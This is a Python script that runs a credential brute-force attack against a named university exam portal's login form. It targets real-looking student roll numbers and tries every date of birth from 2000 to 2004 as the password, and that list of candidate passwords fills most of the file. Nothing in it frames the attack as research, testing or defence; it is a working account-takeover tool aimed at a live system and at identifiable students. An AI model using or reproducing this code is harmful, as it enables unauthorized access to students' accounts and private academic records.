import requests
from bs4 import BeautifulSoup



def open_login_page(session, base_url, typ):
    url = f"{base_url}get-login-form?typ={typ}"
    response = session.get(url)
    data = response.json()
    if data.get('success'):
        return data['html']
    else:
        print("Failed to get the login form.")
        return None

def extract_login_form(html):
    soup = BeautifulSoup(html, 'html.parser')
    form = soup.find('form', {'id': 'login'})
    if form:
        return form
    else:
        print("Login form not found in the HTML.")
        return None

def get_form_action(form):
    return form['action']

def get_form_fields(form):
    fields = {}
    for input_tag in form.find_all('input'):
        name = input_tag.get('name')
        if name:
            fields[name] = input_tag.get('value', '')
    return fields

def check_password(session, action_url, fields, username, password):
    fields['username'] = username
    fields['password'] = password
    
    response = session.post(action_url, data=fields)
    
    if response.status_code == 200:
        if "incorrect" not in response.text.lower() and "invalid" not in response.text.lower():
            print(f"Password '{password}' is correct for user '{username}'")
            print(f"Password found: {password}")
            return True
        else:
            return False
    else:
        print(f"Failed to submit the login form. Status code: {response.status_code}")
        return False

# Replace with the actual base URL and user credentials
base_url = "https://makaut1.ucanapply.com/smartexam/public/"
username = "27600121024"
passwords = ["01012003", "02012003", "03012003", "04012003", "05012003", "06012003", "07012003", "08012003", "09012003", "10012003", "11012003", "12012003", "13012003", "14012003", "15012003", "16012003", "17012003", "18012003", "19012003", "20012003", "21012003", "22012003", "23012003", "24012003", "25012003", "26012003", "27012003", "28012003", "29012003", "30012003", "31012003",
  "01022003", "02022003", "03022003", "04022003", "05022003", "06022003", "07022003", "08022003", "09022003", "10022003", "11022003", "12022003", "13022003", "14022003", "15022003", "16022003", "17022003", "18022003", "19022003", "20022003", "21022003", "22022003", "23022003", "24022003", "25022003", "26022003", "27022003", "28022003",
  "01032003", "02032003", "03032003", "04032003", "05032003", "06032003", "07032003", "08032003", "09032003", "10032003", "11032003", "12032003", "13032003", "14032003", "15032003", "16032003", "17032003", "18032003", "19032003", "20032003", "21032003", "22032003", "23032003", "24032003", "25032003", "26032003", "27032003", "28032003", "29032003", "30032003", "31032003",
  "01042003", "02042003", "03042003", "04042003", "05042003", "06042003", "07042003", "08042003", "09042003", "10042003", "11042003", "12042003", "13042003", "14042003", "15042003", "16042003", "17042003", "18042003", "19042003", "20042003", "21042003", "22042003", "23042003", "24042003", "25042003", "26042003", "27042003", "28042003", "29042003", "30042003",
  "01052003", "02052003", "03052003", "04052003", "05052003", "06052003", "07052003", "08052003", "09052003", "10052003", "11052003", "12052003", "13052003", "14052003", "15052003", "16052003", "17052003", "18052003", "19052003", "20052003", "21052003", "22052003", "23052003", "24052003", "25052003", "26052003", "27052003", "28052003", "29052003", "30052003", "31052003",
  "01062003", "02062003", "03062003", "04062003", "05062003", "06062003", "07062003", "08062003", "09062003", "10062003", "11062003", "12062003", "13062003", "14062003", "15062003", "16062003", "17062003", "18062003", "19062003", "20062003", "21062003", "22062003", "23062003", "24062003", "25062003", "26062003", "27062003", "28062003", "29062003", "30062003",
  "01072003", "02072003", "03072003", "04072003", "05072003", "06072003", "07072003", "08072003", "09072003", "10072003", "11072003", "12072003", "13072003", "14072003", "15072003", "16072003", "17072003", "18072003", "19072003", "20072003", "21072003", "22072003", "23072003", "24072003", "25072003", "26072003", "27072003", "28072003", "29072003", "30072003", "31072003",
  "01082003", "02082003", "03082003", "04082003", "05082003", "06082003", "07082003", "08082003", "09082003", "10082003", "11082003", "12082003", "13082003", "14082003", "15082003", "16082003", "17082003", "18082003", "19082003", "20082003", "21082003", "22082003", "23082003", "24082003", "25082003", "26082003", "27082003", "28082003", "29082003", "30082003", "31082003",
  "01092003", "02092003", "03092003", "04092003", "05092003", "06092003", "07092003", "08092003", "09092003", "10092003", "11092003", "12092003", "13092003", "14092003", "15092003", "16092003", "17092003", "18092003", "19092003", "20092003", "21092003", "22092003", "23092003", "24092003", "25092003", "26092003", "27092003", "28092003", "29092003", "30092003",
  "01102003", "02102003", "03102003", "04102003", "05102003", "06102003", "07102003", "08102003", "09102003", "10102003", "11102003", "12102003", "13102003", "14102003", "15102003", "16102003", "17102003", "18102003", "19102003", "20102003", "21102003", "22102003", "23102003", "24102003", "25102003", "26102003", "27102003", "28102003", "29102003", "30102003", "31102003",
  "01112003", "02112003", "03112003", "04112003", "05112003", "06112003", "07112003", "08112003", "09112003", "10112003", "11112003", "12112003", "13112003", "14112003", "15112003", "16112003", "17112003", "18112003", "19112003", "20112003", "21112003", "22112003", "23112003", "24112003", "25112003", "26112003", "27112003", "28112003", "29112003", "30112003",
  "01122003", "02122003", "03122003", "04122003", "05122003", "06122003", "07122003", "08122003", "09122003", "10122003", "11122003", "12122003", "13122003", "14122003", "15122003", "16122003", "17122003", "18122003", "19122003", "20122003", "21122003", "22122003", "23122003", "24122003", "25122003", "26122003", "27122003", "28122003", "29122003", "30122003", "31122003",
    "01012002", "02012002", "03012002", "04012002", "05012002", "06012002", "07012002", "08012002", "09012002", "10012002",
    "11012002", "12012002", "13012002", "14012002", "15012002", "16012002", "17012002", "18012002", "19012002", "20012002",
    "21012002", "22012002", "23012002", "24012002", "25012002", "26012002", "27012002", "28012002", "29012002", "30012002",
    "31012002", "01022002", "02022002", "03022002", "04022002", "05022002", "06022002", "07022002", "08022002", "09022002",
    "10022002", "11022002", "12022002", "13022002", "14022002", "15022002", "16022002", "17022002", "18022002", "19022002",
    "20022002", "21022002", "22022002", "23022002", "24022002", "25022002", "26022002", "27022002", "28022002", "01032002",
    "02032002", "03032002", "04032002", "05032002", "06032002", "07032002", "08032002", "09032002", "10032002", "11032002",
    "12032002", "13032002", "14032002", "15032002", "16032002", "17032002", "18032002", "19032002", "20032002", "21032002",
    "22032002", "23032002", "24032002", "25032002", "26032002", "27032002", "28032002", "29032002", "30032002", "31032002",
    "01042002", "02042002", "03042002", "04042002", "05042002", "06042002", "07042002", "08042002", "09042002", "10042002",
    "11042002", "12042002", "13042002", "14042002", "15042002", "16042002", "17042002", "18042002", "19042002", "20042002",
    "21042002", "22042002", "23042002", "24042002", "25042002", "26042002", "27042002", "28042002", "29042002", "30042002",
    "01052002", "02052002", "03052002", "04052002", "05052002", "06052002", "07052002", "08052002", "09052002", "10052002",
    "11052002", "12052002", "13052002", "14052002", "15052002", "16052002", "17052002", "18052002", "19052002", "20052002",
    "21052002", "22052002", "23052002", "24052002", "25052002", "26052002", "27052002", "28052002", "29052002", "30052002",
    "31052002", "01062002", "02062002", "03062002", "04062002", "05062002", "06062002", "07062002", "08062002", "09062002",
    "10062002", "11062002", "12062002", "13062002", "14062002", "15062002", "16062002", "17062002", "18062002", "19062002",
    "20062002", "21062002", "22062002", "23062002", "24062002", "25062002", "26062002", "27062002", "28062002", "29062002",
    "30062002", "01072002", "02072002", "03072002", "04072002", "05072002", "06072002", "07072002", "08072002", "09072002",
    "10072002", "11072002", "12072002", "13072002", "14072002", "15072002", "16072002", "17072002", "18072002", "19072002",
    "20072002", "21072002", "22072002", "23072002", "24072002", "25072002", "26072002", "27072002", "28072002", "29072002",
    "30072002", "31072002", "01082002", "02082002", "03082002", "04082002", "05082002", "06082002", "07082002", "08082002",
    "09082002", "10082002", "11082002", "12082002", "13082002", "14082002", "15082002", "16082002", "17082002", "18082002",
    "19082002", "20082002", "21082002", "22082002", "23082002", "24082002", "25082002", "26082002", "27082002", "28082002",
    "29082002", "30082002", "31082002", "01092002", "02092002", "03092002", "04092002", "05092002", "06092002", "07092002",
    "08092002", "09092002", "10092002", "11092002", "12092002", "13092002", "14092002", "15092002", "16092002", "17092002",
    "18092002", "19092002", "20092002", "21092002", "22092002", "23092002", "24092002", "25092002", "26092002", "27092002",
    "28092002", "29092002", "30092002", "01102002", "02102002", "03102002", "04102002", "05102002", "06102002", "07102002",
    "08102002", "09102002", "10102002", "11102002", "12102002", "13102002", "14102002", "15102002", "16102002", "17102002",
    "18102002", "19102002", "20102002", "21102002", "22102002", "23102002", "24102002", "25102002", "26102002", "27102002",
    "28102002", "29102002", "30102002", "31102002", "01112002", "02112002", "03112002", "04112002", "05112002", "06112002",
    "07112002", "08112002", "09112002", "10112002", "11112002", "12112002", "13112002", "14112002", "15112002", "16112002",
    "17112002", "18112002", "19112002", "20112002", "21112002", "22112002", "23112002", "24112002", "25112002", "26112002",
    "27112002", "28112002", "29112002", "30112002", "01122002", "02122002", "03122002", "04122002", "05122002", "06122002",
    "07122002", "08122002", "09122002", "10122002", "11122002", "12122002", "13122002", "14122002", "15122002", "16122002",
    "17122002", "18122002", "19122002", "20122002", "21122002", "22122002", "23122002", "24122002", "25122002", "26122002",
    "27122002", "28122002", "29122002", "30122002", "31122002",
    "01012001", "02012001", "03012001", "04012001", "05012001", "06012001", "07012001", "08012001", "09012001", "10012001",
    "11012001", "12012001", "13012001", "14012001", "15012001", "16012001", "17012001", "18012001", "19012001", "20012001",
    "21012001", "22012001", "23012001", "24012001", "25012001", "26012001", "27012001", "28012001", "29012001", "30012001",
    "31012001", "01022001", "02022001", "03022001", "04022001", "05022001", "06022001", "07022001", "08022001", "09022001",
    "10022001", "11022001", "12022001", "13022001", "14022001", "15022001", "16022001", "17022001", "18022001", "19022001",
    "20022001", "21022001", "22022001", "23022001", "24022001", "25022001", "26022001", "27022001", "28022001", "01032001",
    "02032001", "03032001", "04032001", "05032001", "06032001", "07032001", "08032001", "09032001", "10032001", "11032001",
    "12032001", "13032001", "14032001", "15032001", "16032001", "17032001", "18032001", "19032001", "20032001", "21032001",
    "22032001", "23032001", "24032001", "25032001", "26032001", "27032001", "28032001", "29032001", "30032001", "31032001",
    "01042001", "02042001", "03042001", "04042001", "05042001", "06042001", "07042001", "08042001", "09042001", "10042001",
    "11042001", "12042001", "13042001", "14042001", "15042001", "16042001", "17042001", "18042001", "19042001", "20042001",
    "21042001", "22042001", "23042001", "24042001", "25042001", "26042001", "27042001", "28042001", "29042001", "30042001",
    "01052001", "02052001", "03052001", "04052001", "05052001", "06052001", "07052001", "08052001", "09052001", "10052001",
    "11052001", "12052001", "13052001", "14052001", "15052001", "16052001", "17052001", "18052001", "19052001", "20052001",
    "21052001", "22052001", "23052001", "24052001", "25052001", "26052001", "27052001", "28052001", "29052001", "30052001",
    "31052001", "01062001", "02062001", "03062001", "04062001", "05062001", "06062001", "07062001", "08062001", "09062001",
    "10062001", "11062001", "12062001", "13062001", "14062001", "15062001", "16062001", "17062001", "18062001", "19062001",
    "20062001", "21062001", "22062001", "23062001", "24062001", "25062001", "26062001", "27062001", "28062001", "29062001",
    "30062001", "01072001", "02072001", "03072001", "04072001", "05072001", "06072001", "07072001", "08072001", "09072001",
    "10072001", "11072001", "12072001", "13072001", "14072001", "15072001", "16072001", "17072001", "18072001", "19072001",
    "20072001", "21072001", "22072001", "23072001", "24072001", "25072001", "26072001", "27072001", "28072001", "29072001",
    "30072001", "31072001", "01082001", "02082001", "03082001", "04082001", "05082001", "06082001", "07082001", "08082001",
    "09082001", "10082001", "11082001", "12082001", "13082001", "14082001", "15082001", "16082001", "17082001", "18082001",
    "19082001", "20082001", "21082001", "22082001", "23082001", "24082001", "25082001", "26082001", "27082001", "28082001",
    "29082001", "30082001", "31082001", "01092001", "02092001", "03092001", "04092001", "05092001", "06092001", "07092001",
    "08092001", "09092001", "10092001", "11092001", "12092001", "13092001", "14092001", "15092001", "16092001", "17092001",
    "18092001", "19092001", "20092001", "21092001", "22092001", "23092001", "24092001", "25092001", "26092001", "27092001",
    "28092001", "29092001", "30092001", "01102001", "02102001", "03102001", "04102001", "05102001", "06102001", "07102001",
    "08102001", "09102001", "10102001", "11102001", "12102001", "13102001", "14102001", "15102001", "16102001", "17102001",
    "18102001", "19102001", "20102001", "21102001", "22102001", "23102001", "24102001", "25102001", "26102001", "27102001",
    "28102001", "29102001", "30102001", "31102001", "01112001", "02112001", "03112001", "04112001", "05112001", "06112001",
    "07112001", "08112001", "09112001", "10112001", "11112001", "12112001", "13112001", "14112001", "15112001", "16112001",
    "17112001", "18112001", "19112001", "20112001", "21112001", "22112001", "23112001", "24112001", "25112001", "26112001",
    "27112001", "28112001", "29112001", "30112001", "01122001", "02122001", "03122001", "04122001", "05122001", "06122001",
    "07122001", "08122001", "09122001", "10122001", "11122001", "12122001", "13122001", "14122001", "15122001", "16122001",
    "17122001", "18122001", "19122001", "20122001", "21122001", "22122001", "23122001", "24122001", "25122001", "26122001",
    "27122001", "28122001", "29122001", "30122001", "31122001",
    "01012004", "02012004", "03012004", "04012004", "05012004", "06012004", "07012004", "08012004", "09012004", "10012004",
    "11012004", "12012004", "13012004", "14012004", "15012004", "16012004", "17012004", "18012004", "19012004", "20012004",
    "21012004", "22012004", "23012004", "24012004", "25012004", "26012004", "27012004", "28012004", "29012004", "30012004",
    "31012004", "01022004", "02022004", "03022004", "04022004", "05022004", "06022004", "07022004", "08022004", "09022004",
    "10022004", "11022004", "12022004", "13022004", "14022004", "15022004", "16022004", "17022004", "18022004", "19022004",
    "20022004", "21022004", "22022004", "23022004", "24022004", "25022004", "26022004", "27022004", "28022004", "01032004",
    "02032004", "03032004", "04032004", "05032004", "06032004", "07032004", "08032004", "09032004", "10032004", "11032004",
    "12032004", "13032004", "14032004", "15032004", "16032004", "17032004", "18032004", "19032004", "20032004", "21032004",
    "22032004", "23032004", "24032004", "25032004", "26032004", "27032004", "28032004", "29032004", "30032004", "31032004",
    "01042004", "02042004", "03042004", "04042004", "05042004", "06042004", "07042004", "08042004", "09042004", "10042004",
    "11042004", "12042004", "13042004", "14042004", "15042004", "16042004", "17042004", "18042004", "19042004", "20042004",
    "21042004", "22042004", "23042004", "24042004", "25042004", "26042004", "27042004", "28042004", "29042004", "30042004",
    "01052004", "02052004", "03052004", "04052004", "05052004", "06052004", "07052004", "08052004", "09052004", "10052004",
    "11052004", "12052004", "13052004", "14052004", "15052004", "16052004", "17052004", "18052004", "19052004", "20052004",
    "21052004", "22052004", "23052004", "24052004", "25052004", "26052004", "27052004", "28052004", "29052004", "30052004",
    "31052004", "01062004", "02062004", "03062004", "04062004", "05062004", "06062004", "07062004", "08062004", "09062004",
    "10062004", "11062004", "12062004", "13062004", "14062004", "15062004", "16062004", "17062004", "18062004", "19062004",
    "20062004", "21062004", "22062004", "23062004", "24062004", "25062004", "26062004", "27062004", "28062004", "29062004",
    "30062004", "01072004", "02072004", "03072004", "04072004", "05072004", "06072004", "07072004", "08072004", "09072004",
    "10072004", "11072004", "12072004", "13072004", "14072004", "15072004", "16072004", "17072004", "18072004", "19072004",
    "20072004", "21072004", "22072004", "23072004", "24072004", "25072004", "26072004", "27072004", "28072004", "29072004",
    "30072004", "31072004", "01082004", "02082004", "03082004", "04082004", "05082004", "06082004", "07082004", "08082004",
    "09082004", "10082004", "11082004", "12082004", "13082004", "14082004", "15082004", "16082004", "17082004", "18082004",
    "19082004", "20082004", "21082004", "22082004", "23082004", "24082004", "25082004", "26082004", "27082004", "28082004",
    "29082004", "30082004", "31082004", "01092004", "02092004", "03092004", "04092004", "05092004", "06092004", "07092004",
    "08092004", "09092004", "10092004", "11092004", "12092004", "13092004", "14092004", "15092004", "16092004", "17092004",
    "18092004", "19092004", "20092004", "21092004", "22092004", "23092004", "24092004", "25092004", "26092004", "27092004",
    "28092004", "29092004", "30092004", "01102004", "02102004", "03102004", "04102004", "05102004", "06102004", "07102004",
    "08102004", "09102004", "10102004", "11102004", "12102004", "13102004", "14102004", "15102004", "16102004", "17102004",
    "18102004", "19102004", "20102004", "21102004", "22102004", "23102004", "24102004", "25102004", "26102004", "27102004",
    "28102004", "29102004", "30102004", "31102004", "01112004", "02112004", "03112004", "04112004", "05112004", "06112004",
    "07112004", "08112004", "09112004", "10112004", "11112004", "12112004", "13112004", "14112004", "15112004", "16112004",
    "17112004", "18112004", "19112004", "20112004", "21112004", "22112004", "23112004", "24112004", "25112004", "26112004",
    "27112004", "28112004", "29112004", "30112004", "01122004", "02122004", "03122004", "04122004", "05122004", "06122004",
    "07122004", "08122004", "09122004", "10122004", "11122004", "12122004", "13122004", "14122004", "15122004", "16122004",
    "17122004", "18122004", "19122004", "20122004", "21122004", "22122004", "23122004", "24122004", "25122004", "26122004",
    "27122004", "28122004", "29122004", "30122004", "31122004",
    "01012000", "02012000", "03012000", "04012000", "05012000", "06012000", "07012000", "08012000", "09012000", "10012000",
    "11012000", "12012000", "13012000", "14012000", "15012000", "16012000", "17012000", "18012000", "19012000", "20012000",
    "21012000", "22012000", "23012000", "24012000", "25012000", "26012000", "27012000", "28012000", "29012000", "30012000",
    "31012000", "01022000", "02022000", "03022000", "04022000", "05022000", "06022000", "07022000", "08022000", "09022000",
    "10022000", "11022000", "12022000", "13022000", "14022000", "15022000", "16022000", "17022000", "18022000", "19022000",
    "20022000", "21022000", "22022000", "23022000", "24022000", "25022000", "26022000", "27022000", "28022000", "29022000",
    "01032000", "02032000", "03032000", "04032000", "05032000", "06032000", "07032000", "08032000", "09032000", "10032000",
    "11032000", "12032000", "13032000", "14032000", "15032000", "16032000", "17032000", "18032000", "19032000", "20032000",
    "21032000", "22032000", "23032000", "24032000", "25032000", "26032000", "27032000", "28032000", "29032000", "30032000",
    "31032000", "01042000", "02042000", "03042000", "04042000", "05042000", "06042000", "07042000", "08042000", "09042000",
    "10042000", "11042000", "12042000", "13042000", "14042000", "15042000", "16042000", "17042000", "18042000", "19042000",
    "20042000", "21042000", "22042000", "23042000", "24042000", "25042000", "26042000", "27042000", "28042000", "29042000",
    "30042000", "01052000", "02052000", "03052000", "04052000", "05052000", "06052000", "07052000", "08052000", "09052000",
    "10052000", "11052000", "12052000", "13052000", "14052000", "15052000", "16052000", "17052000", "18052000", "19052000",
    "20052000", "21052000", "22052000", "23052000", "24052000", "25052000", "26052000", "27052000", "28052000", "29052000",
    "30052000", "31052000", "01062000", "02062000", "03062000", "04062000", "05062000", "06062000", "07062000", "08062000",
    "09062000", "10062000", "11062000", "12062000", "13062000", "14062000", "15062000", "16062000", "17062000", "18062000",
    "19062000", "20062000", "21062000", "22062000", "23062000", "24062000", "25062000", "26062000", "27062000", "28062000",
    "29062000", "30062000", "01072000", "02072000", "03072000", "04072000", "05072000", "06072000", "07072000", "08072000",
    "09072000", "10072000", "11072000", "12072000", "13072000", "14072000", "15072000", "16072000", "17072000", "18072000",
    "19072000", "20072000", "21072000", "22072000", "23072000", "24072000", "25072000", "26072000", "27072000", "28072000",
    "29072000", "30072000", "31072000", "01082000", "02082000", "03082000", "04082000", "05082000", "06082000", "07082000",
    "08082000", "09082000", "10082000", "11082000", "12082000", "13082000", "14082000", "15082000", "16082000", "17082000",
    "18082000", "19082000", "20082000", "21082000", "22082000", "23082000", "24082000", "25082000", "26082000", "27082000",
    "28082000", "29082000", "30082000", "31082000", "01092000", "02092000", "03092000", "04092000", "05092000", "06092000",
    "07092000", "08092000", "09092000", "10092000", "11092000", "12092000", "13092000", "14092000", "15092000", "16092000",
    "17092000", "18092000", "19092000", "20092000", "21092000", "22092000", "23092000", "24092000", "25092000", "26092000",
    "27092000", "28092000", "29092000", "30092000", "01102000", "02102000", "03102000", "04102000", "05102000", "06102000",
    "07102000", "08102000", "09102000", "10102000", "11102000", "12102000", "13102000", "14102000", "15102000", "16102000",
    "17102000", "18102000", "19102000", "20102000", "21102000", "22102000", "23102000", "24102000", "25102000", "26102000",
    "27102000", "28102000", "29102000", "30102000", "31102000", "01112000", "02112000", "03112000", "04112000", "05112000",
    "06112000", "07112000", "08112000", "09112000", "10112000", "11112000", "12112000", "13112000", "14112000", "15112000",
    "16112000", "17112000", "18112000", "19112000", "20112000", "21112000", "22112000", "23112000", "24112000", "25112000",
    "26112000", "27112000", "28112000", "29112000", "30112000", "01122000", "02122000", "03122000", "04122000", "05122000",
    "06122000", "07122000", "08122000", "09122000", "10122000", "11122000", "12122000", "13122000", "14122000", "15122000",
    "16122000", "17122000", "18122000", "19122000", "20122000", "21122000", "22122000", "23122000", "24122000", "25122000",
    "26122000", "27122000", "28122000", "29122000", "30122000", "31122000"
]

# user_ids = [ "27600120015", "27600121001", "27600121002", "27600121003", "27600121004",     "27600121005", "27600121006", "27600121007", "27600121008", "27600121009",     "27600121010", "27600121011", "27600121012", "27600121013", "27600121014",     "27600121015", "27600121016", "27600121017", "27600121018", "27600121019",     "27600121020", "27600121021", "27600121022", "27600121023", "27600121024",     "27600121025", "27600121026", "27600121027", "27600121028", "27600121029",     "27600121030", "27600121031", "27600121032", "27600121033", "27600121034",     "27600121035", "27600121036", "27600121037", "27600121038", "27600121039",     "27600121040", "27600121041", "27600121042", "27600121043", "27600121044",     "27600121045", "27600121046", "27600121047", "27600121048", "27600121049",     "27600121050", "27600121051", "27600121052", "27600121053", "27600121054",     "27600121055", "27600121056", "27600121057", "27600121058", "27600121059",     "27600121060", "27600121061", "27600121062", "27600121063", "27600121065",     "27600121066", "27600121067", "27600121068", "27600121069", "27600121070",     "27600121071", "27600121072", "27600121073", "27600121074", "27600121076",     "27600121077", "27600121078", "27600121079", "27600121080", "27600121081",     "27600121082", "27600121083", "27600121084", "27600121085", "27600121086",     "27600121087", "27600121088", "27600121089", "27600121090", "27600121092",     "27600121093", "27600121094", "27600121095", "27600121097", "27600121098",     "27600121099", "27600121100", "27600121101", "27600121102", "27600121103",     "27600121104", "27600121105", "27600121106", "27600121107", "27600121108",     "27600121110", "27600121111", "27600121112", "27600121113", "27600121114",     "27600121115", "27600121116", "27600121117", "27600121118", "27600121119",     "27600121120", "27600121121", "27600121122", "27600121123", "27600121124",     "27600121125", "27600121126", "27600121127", "27600121128", "27600121129",     "27600121130", "27600121131", "27600121132", "27600121133", "27600121134",     "27600121135", "27600121136", "27600121137", "27600121138", "27600121139",     "27600121140", "27600121141", "27600121142", "27600121143", "27600121144",     "27600121145", "27600121146", "27600121147", "27600121148", "27600121149",     "27600121150", "27600121151", "27600121152", "27600121153", "27600121154",     "27600121155", "27600121156", "27600121157", "27600121158", "27600121159",     "27600121160", "27600121161", "27600121162", "27600121164", "27600121165",     "27600121166", "27600121167", "27600121168", "27600121169", "27600121170",     "27600121171", "27600121172", "27600121174", "27600121175", "27600121176",     "27600121178", "27600121179", "27600121180", "27600121181", "27600121182",     "27600121183", "27600121184", "27600121185", "27600121186", "27600121187",     "27600121188", "27600121189", "27600122001", "27600122002", "27600122003", "27600122004", "27600122005", "27600122006", "27600122007", "27600122008", "27600122009", "27600122010", "27600122011", "27600122012"]
user_ids=["27600121043"]
# Start a session and get the login form
session = requests.Session()
html = open_login_page(session, base_url, 5)

if html:
    form = extract_login_form(html)
    if form:
        action_url = get_form_action(form)
        fields = get_form_fields(form)
        
        # Iterate over the list of passwords
        for username in user_ids:
            print("starting for " +username)
            for password in passwords:
                if check_password(session, action_url, fields, username, password):
                    break
else:
    print("Failed to navigate to the login page.")
